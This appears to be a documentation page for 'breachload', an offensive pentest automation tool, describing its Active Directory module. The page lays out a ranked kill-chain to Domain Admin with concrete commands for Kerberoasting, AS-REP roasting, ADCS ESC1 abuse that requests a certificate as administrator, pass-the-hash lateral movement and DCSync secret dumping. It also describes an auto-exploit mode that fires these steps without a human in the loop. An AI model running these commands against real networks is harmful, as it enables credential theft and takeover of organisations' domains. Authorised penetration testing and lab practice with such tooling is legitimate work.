# Active Directory

breachload treats AD as a first-class engagement type: BloodHound + ADCS +
roasting all parsed by the same tooling, composed into a ranked path to
Domain Admin, and (in `auto-exploit` mode) fired end-to-end.

## Detection

- **DC tag** — the correlator tags any host with Kerberos (88) + LDAP
  (389/636/3268) as `dc`; the LDAP service-info gives the domain, which
  becomes a `domain:<x>` tag on the host.
- **netexec SMB** — banner parsed for host / domain / OS / signing.

Once a host has `dc` + `domain:corp.local`, every AD command below wires up
automatically.

## Enumerate

```bash
# BloodHound
breachload bloodhound <cfg> --scan users.json
breachload bloodhound <cfg> --scan groups.json
# … for each collection file
```

Parses users/groups/computers/aces, flags kerberoastable (`hasspn`),
AS-REP-roastable (`dontreqpreauth`), unconstrained-delegation hosts, and
every dangerous outbound ACE (`GenericAll`, `WriteOwner`, `WriteDacl`,
`ForceChangePassword`, `AddMember`, `AllExtendedRights` for DCSync).

```bash
# ADCS - after running `certipy find -vulnerable -stdout > certipy.txt` on the DC
breachload adcs <cfg> --scan certipy.txt
```

Parses ESC1-ESC16 findings, adds the `certipy req` exploit command for each,
and detects **dangling template references** (the CA still publishes a
template whose AD object is gone — recreate it as ESC1 for a bespoke DA
cert).

## Compose the kill-chain

```bash
breachload adchain <cfg>
```

Orders every AD finding by leverage (lower rank = do first):

1. **DCSync** — `AllExtendedRights` / GetChanges over the domain
2. **ADCS ESC1-16** — enroll a cert as DA
3. **Unconstrained delegation** — coerce a DC + capture the TGT
4. **RBCD** — GenericWrite/GenericAll on a computer
5. **AS-REP roast** — no cred needed
6. **Kerberoast** — needs any domain cred
7. **ACL abuse** — GenericAll/Write/… over a user

Each line carries the concrete next command (impacket / certipy / bloodyAD /
rbcd.py) and a "needs a domain credential first" gate when it does.

## Active Kerberos

```bash
# With a domain credential we can Kerberoast:
breachload kerberos <cfg> --dc 10.10.11.5 --domain corp.local --run

# AS-REP roast a userlist (no credentials needed):
breachload kerberos <cfg> --dc 10.10.11.5 --domain corp.local --users users.txt --run

# Parse an offline transcript:
breachload kerberos <cfg> --dc 10.10.11.5 --domain corp.local --parse-file roast.txt
```

Every recovered `$krb5tgs$…` / `$krb5asrep$…` becomes a `Finding` **and** a
`kind="hash"` `Credential` (with the hashcat mode in the description) that
the `crack` loop attacks automatically.

## Autonomous ADCS ESC1

If `auto-exploit` mode is on and the state has a `dc` host + a password
credential + an ADCS ESC1 finding, the POST phase automatically fires:

```
certipy req -u <user>@<domain> -p <pass> -dc-ip <dc> -template <T> -upn administrator@<domain>
```

On success (`Saved certificate to administrator.pfx`) the finding is marked
`confirmed`, and the follow-up `certipy auth -pfx administrator.pfx` (for
the NT hash / TGT + DCSync) is emitted.

## Lateral movement to other hosts

Once you have creds (from Kerberoast crack, GPP cpassword, IMDS, or spray):

```bash
breachload lateral <cfg>
```

Emits `winrm / wmi / psexec / smbexec` argvs per Windows host x usable cred,
with **Pass-the-Hash** variants when the credential is an NT hash. See
[Post-Exploitation](Post-Exploitation).

## The overall AD flow

```
recon      -> DC + domain tags land
enum       -> netexec + enum4linux + LDAP anon-bind
              (dump users.txt for AS-REP roast)
manual     -> BloodHound collector on the DC, transfer JSONs back
              -> breachload bloodhound (all findings land)
              -> certipy find -vulnerable  ->  breachload adcs (ESC findings land)
compose    -> breachload adchain              (ordered path to DA)
attack     -> breachload kerberos --run       (hashes -> crack)
              breachload lateral             (each Windows host x cred)
              breachload adcs                (already parsed; auto-exploit fires ESC1)
DA         -> certipy auth -pfx administrator.pfx   -> impacket-secretsdump DCSync
```

## Gotchas

- **Time skew** — Kerberos wants clocks synced to the DC. `ntpdate <dc>` or
  `sudo chronyd -q "server <dc> iburst"` before any impacket call.
- **certipy MTU on HTB** — some HTB VPN paths trip on the default certipy
  packet size. Setting `sudo ip link set tun0 mtu 1100` fixed it on Season
  11 DanglingTree.
- **GPP cpassword decode** — needs the `cryptography` package
  (`pip install cryptography`); breachload guards the import and skips the
  decrypt cleanly when it's missing.
